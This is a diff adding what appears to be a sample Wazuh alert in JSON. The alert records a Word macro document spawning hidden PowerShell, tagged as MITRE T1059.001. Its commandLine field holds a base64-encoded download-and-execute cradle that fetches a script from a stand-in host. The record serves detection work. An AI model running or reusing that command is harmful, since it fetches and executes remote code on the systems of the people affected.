@@ -1,0 +1,59 @@
+{
+  "timestamp": "2026-07-01T09:14:22.512+0000",
+  "rule": {
+    "level": 12,
+    "description": "Encoded PowerShell command launched by an Office application",
+    "id": "100010",
+    "mitre": {
+      "id": ["T1059.001"],
+      "tactic": ["Execution"],
+      "technique": ["PowerShell"]
+    },
+    "firedtimes": 1,
+    "groups": ["windows", "sysmon", "sysmon_event1", "powershell"]
+  },
+  "agent": {
+    "id": "003",
+    "name": "CLINIC-BILL01",
+    "ip": "192.0.2.13"
+  },
+  "manager": {
+    "name": "wazuh-manager"
+  },
+  "id": "1782897262.104512",
+  "decoder": {
+    "name": "windows_eventchannel"
+  },
+  "location": "EventChannel",
+  "data": {
+    "win": {
+      "system": {
+        "providerName": "Microsoft-Windows-Sysmon",
+        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+        "eventID": "1",
+        "version": "5",
+        "level": "4",
+        "task": "1",
+        "opcode": "0",
+        "systemTime": "2026-07-01T09:14:21.8743210Z",
+        "eventRecordID": "48213",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "computer": "CLINIC-BILL01",
+        "severityValue": "INFORMATION"
+      },
+      "eventdata": {
+        "utcTime": "2026-07-01 09:14:21.874",
+        "processId": "6120",
+        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "originalFileName": "PowerShell.EXE",
+        "commandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUAcwAuAGUAeABhAG0AcABsAGUALgB0AGUAcwB0AC8AcAAuAHAAcwAxACcAKQA=",
+        "currentDirectory": "C:\\Users\\billing01\\Documents\\",
+        "user": "CLINIC\\billing01",
+        "integrityLevel": "Medium",
+        "parentProcessId": "4388",
+        "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "parentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\billing01\\Downloads\\invoice_0701.docm\""
+      }
+    }
+  }
+}
